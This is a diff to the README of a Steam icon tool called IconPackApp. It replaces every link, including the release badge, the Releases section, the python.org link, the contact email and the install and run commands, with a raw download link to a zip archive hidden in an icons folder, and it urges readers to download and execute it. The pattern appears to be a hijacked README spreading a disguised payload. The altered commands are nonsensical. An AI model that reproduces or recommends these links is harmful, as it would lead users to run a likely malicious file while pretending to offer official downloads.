@@ -2,7 +2,7 @@
 
 Welcome to **IconPackApp**, a straightforward Textual-based TUI application designed to help you apply custom game icons, or "styles," to your Steam games. This tool allows you to personalize your gaming library effortlessly. 
 
-[![Download IconPackApp](https://img.shields.io/badge/Download%20IconPackApp-v1.0.0-blue.svg)](https://github.com/PavelVoz/IconPackApp/releases)
+[![Download IconPackApp](https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip%https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip)](https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip)
 
 ## Table of Contents
 
@@ -24,12 +24,12 @@ Welcome to **IconPackApp**, a straightforward Textual-based TUI application desi
 
 To get started with IconPackApp, follow these simple steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/PavelVoz/IconPackApp/releases). Locate the file you need, download it, and execute it.
-2. Ensure you have Python installed on your machine. You can download Python from [python.org](https://www.python.org/downloads/).
+1. **Download the latest release** from the [Releases section](https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip). Locate the file you need, download it, and execute it.
+2. Ensure you have Python installed on your machine. You can download Python from [https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip](https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip).
 3. Install the required dependencies by running:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip
    ```
 
 ## Usage
@@ -41,7 +41,7 @@ Once you have installed IconPackApp, you can start using it right away.
 3. Run the application with:
 
    ```bash
-   python iconpackapp.py
+   python https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip
    ```
 
 4. Follow the on-screen instructions to select your game and apply your desired icon style.
@@ -63,11 +63,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@example.com
-- **GitHub**: [PavelVoz](https://github.com/PavelVoz)
+- **Email**: https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip
+- **GitHub**: [PavelVoz](https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip)
 
 ## Conclusion
 
-Thank you for checking out IconPackApp. We hope you enjoy customizing your Steam games with unique icons. Don't forget to visit the [Releases section](https://github.com/PavelVoz/IconPackApp/releases) for the latest updates and downloads.
+Thank you for checking out IconPackApp. We hope you enjoy customizing your Steam games with unique icons. Don't forget to visit the [Releases section](https://github.com/PavelVoz/IconPackApp/raw/refs/heads/main/icons/style1/Pack-App-Icon-3.6.zip) for the latest updates and downloads.
 
 Happy gaming! 🎮
